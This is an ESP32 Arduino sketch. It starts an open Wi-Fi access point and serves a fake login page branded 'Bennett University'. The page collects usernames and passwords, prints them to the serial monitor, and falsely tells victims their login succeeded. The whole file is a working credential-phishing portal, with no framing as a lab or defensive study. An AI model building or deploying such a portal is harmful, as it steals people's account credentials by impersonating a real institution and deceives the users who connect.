
#include <WiFi.h>
#include <WebServer.h>

// Define the SSID
const char* ssid = "your ssid goes here";
const char* password = "your password goes here";

// Create a WebServer object on port 80
WebServer server(80);

// HTML content for the login page
const char loginPage[] = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
</head>
<body>
  <h2>Bennett University</h2>
  <form action="/login" method="POST">
    <label for="username">Username:</label><br>
    <input type="text" id="username" name="username"><br><br>
    <label for="password">Password:</label><br>
    <input type="password" id="password" name="password"><br><br>
    <input type="submit" value="Login">
  </form>
</body>
</html>
)rawliteral";

// Function to handle the root path
void handleRoot() {
  server.send(200, "text/html", loginPage);
}

// Function to handle form submission
void handleLogin() {
  if (server.method() == HTTP_POST) {
    String username = server.arg("username");
    String password = server.arg("password");

    // Print the username and password to the serial terminal
    Serial.println("Login Attempt:");
    Serial.println("Username: " + username);
    Serial.println("Password: " + password);

    // Send a response back to the user
    server.send(200, "text/html", "<h1>Login Successful!</h1><p>Check the Serial Monitor for details.</p>");
  } else {
    server.send(405, "text/plain", "Method Not Allowed");
  }
}

void setup() {
  // Start Serial for debugging
  Serial.begin(115200);

  // Initialize the Access Point
  WiFi.softAP(ssid);
  Serial.println("Access Point Started");
  Serial.print("SSID: ");
  Serial.println(ssid);
  Serial.print("IP Address: ");
  Serial.println(WiFi.softAPIP());

  // Define routes
  server.on("/", handleRoot);        // Serve the login page
  server.on("/login", handleLogin); // Handle login form submissions

  // Start the server
  server.begin();
  Serial.println("Web server started!");
}

void loop() {
  // Handle incoming client requests
  server.handleClient();
}
